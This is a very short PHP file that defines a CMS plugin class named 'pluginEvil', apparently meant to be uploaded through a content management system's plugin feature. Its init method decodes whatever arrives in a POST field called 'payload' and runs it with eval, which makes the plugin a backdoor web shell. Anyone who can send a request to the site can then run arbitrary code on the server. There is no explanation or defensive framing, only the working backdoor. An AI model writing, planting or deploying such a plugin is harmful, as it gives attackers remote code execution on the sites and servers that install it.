<?php
class pluginEvil extends Plugin {
	public function init() { eval(base64_decode($_POST['payload'])); }
}
